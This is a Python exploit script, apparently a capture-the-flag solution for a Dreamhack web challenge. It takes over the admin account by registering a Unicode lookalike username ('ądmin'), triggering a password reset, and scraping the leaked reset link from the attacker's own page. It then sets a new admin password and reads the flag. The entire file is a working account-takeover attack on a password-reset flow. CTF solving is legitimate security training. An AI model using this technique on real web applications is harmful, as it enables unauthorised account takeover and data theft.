import requests
import re

url = "http://host8.dreamhack.games:23573/"
s = requests.Session()

creds = {
    'username': 'ądmin',
    'password': 'a'
}

# login
res = s.post(f'{url}/v1/signup', data=creds)
res = s.post(f'{url}/v1/login', data=creds)

# leak admin reset link
res = requests.post(f'{url}/v2/request-password-change', data={
    'username': creds['username']
})

res = s.get(f'{url}/v1/mypage')

reset_link = re.findall(r'href="(/v2/change-password/.+?)"', res.text)[0].strip()
print("> Reset link:", reset_link)

# reset admin password
res = s.post(f'{url}/{reset_link}', data={
    'new_password': creds['password'],
    'confirm_password': creds['password'],
})

# admin login
res = s.post(f'{url}/v2/login', data=creds)

res = s.get(f'{url}/v2/mypage')

flag = re.findall(r'(DH{.+?})', res.text)[0].strip()
print("Flag:", flag)